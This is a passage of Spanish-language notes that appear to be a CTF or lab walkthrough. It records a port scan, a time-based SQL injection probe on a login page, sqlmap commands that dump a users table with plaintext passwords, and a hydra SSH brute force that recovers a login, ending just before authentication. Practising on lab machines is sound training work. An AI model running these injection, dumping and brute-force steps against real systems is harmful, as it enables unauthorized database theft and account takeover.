PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Vamos a la web , le damos al botón de login y vemos un login marronero

-Probamos a poner la siguiente inyección básica:
	 'or sleep(5)-- -
	 -La web se queda pensando un tiempo por lo que es vulnerable

-Usamos Sqlmap para extraer toda la información de la BBDD:
	-sqlmap -u http://backend/login.html --dbs --batch --forms
		available databases [5]:
		 information_schema
		 mysql
		 performance_schema
		 sys
		 users (Nos interesa Esta!!)
	-sqlmap -u http://backend/login.html -D users --tables --batch --forms
		Database: users
		[1 table]
		+----------+
		| usuarios |
		+----------+
	-sqlmap -u http://backend/login.html -D users -T usuarios --dump --batch --forms
		Database: users
		Table: usuarios
		[3 entries]
		+----+---------------+----------+
		| id | password      | username |
		+----+---------------+----------+
		| 1  | $paco$123     | paco      |
		| 2  | P123pepe3456P | pepe |
		| 3  | jjuuaann123   | juan       |
		+----+---------------+----------+

-Nos creamos un fichero de usuarios y otro con contraseñas y aplicamos fuerza bruta con hydra:
	-hydra ssh://172.17.0.2 -L users.txt -P passwords.txt -V
		login: pepe   password: P123pepe3456P
	-Nos autenticamos con el usuario pepe:
		